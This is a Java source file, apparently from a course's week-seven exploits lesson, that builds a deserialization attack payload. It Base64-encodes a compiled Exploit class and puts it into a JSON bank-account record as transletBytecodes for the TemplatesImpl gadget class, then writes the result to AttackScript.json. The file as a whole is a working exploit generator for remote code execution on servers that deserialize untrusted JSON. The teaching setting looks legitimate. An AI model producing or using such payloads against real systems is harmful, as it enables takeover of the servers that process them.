package edu.aluismarte.diplomado.week7.exploits;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.UUID;

/**
 * @author aluis on 5/9/2022.
 */
public class ExploitEncoder {

    public static void main(String[] args) throws Exception {
        Path path = Paths.get("build/classes/java/main/edu/aluismarte/diplomado/week7/exploits/Exploit.class");
        byte[] classBytes = Files.readAllBytes(path);
        byte[] encodedBytes = Base64.getEncoder().encode(classBytes);
        System.out.println("Crafted Exploit (Encoded) :");
        System.out.println(new String(encodedBytes));
        JSONObject craftObject = new JSONObject();
        craftObject.put("customerName", "evilUser");
        craftObject.put("accountType", "checking");
        craftObject.put("accountNumber", UUID.randomUUID().toString());
        craftObject.put("balance", 10000);
        JSONArray craftList = new JSONArray();
        craftList.add("org.apache.xalan.xsltc.trax.TemplatesImpl");
        JSONObject transletObject = new JSONObject();
        JSONArray transletArray = new JSONArray();
        transletArray.add(new String(encodedBytes));
        transletObject.put("transletBytecodes", transletArray);
        transletObject.put("transletName", "businessObject");
        transletObject.put("outputProperties", new JSONObject());
        craftList.add(transletObject);
        craftObject.put("accountNotes", craftList);
        System.out.println("Crafted JSON (with embedded bytes) :");
        System.out.println(craftObject.toJSONString());
        try (FileWriter file = new FileWriter("./AttackScript.json")) {
            file.write(craftObject.toJSONString());
            file.flush();
        } catch (IOException e) {
            System.out.println("Failed to write file");
            e.printStackTrace();
        }
    }
}
